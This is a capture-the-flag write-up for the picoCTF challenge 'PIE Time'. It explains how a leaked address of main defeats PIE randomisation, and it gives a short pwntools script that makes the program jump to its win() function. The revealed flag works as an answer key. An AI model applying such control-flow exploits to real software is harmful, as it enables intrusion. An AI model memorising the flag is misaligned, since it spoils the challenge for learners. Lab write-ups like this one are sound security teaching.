# PIE Time

**Link**: https://play.picoctf.org/practice/challenge/490

**Difficulty**: easy

## Description

Can you try to get the flag? Beware we have PIE!

## Resources

- **vuln**: the vulnerable binary
- **vuln.c**: its source code
- **solver.py**: pwntools exploit

## Key observations (from the source)

- The binary is a PIE, so addresses are randomized each run — but `main` prints
  its own address, handing us the leak we need:

      printf("Address of main: %p\n", &main);

- It then reads a hex address and **jumps straight to it**:

      scanf("%lx", &val);
      void (*foo)(void) = (void (*)())val;
      foo();

- There is a `win()` function that opens and prints `flag.txt`. It is never called
  normally, so we just have to jump to it.

## How to solve

PIE randomizes the load base but **not** the relative offset between symbols. So:

    base   = leaked_main - offset_of(main)     # recover the load base
    target = base + offset_of(win)             # absolute address of win

pwntools reads those static offsets from the ELF for us via `elf.symbols`.

Exploit (see `solver.py`, run with `python3 solver.py REMOTE`):

    string  = io.recvline().decode()
    address = int(string[19:], 16)             # parse leaked main address
    main    = elf.symbols['main']
    win     = elf.symbols['win']
    offset  = address - main                   # PIE base
    payload = hex(win + offset).encode()       # program expects ASCII hex
    io.sendline(payload)
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())

## Flag

    picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}
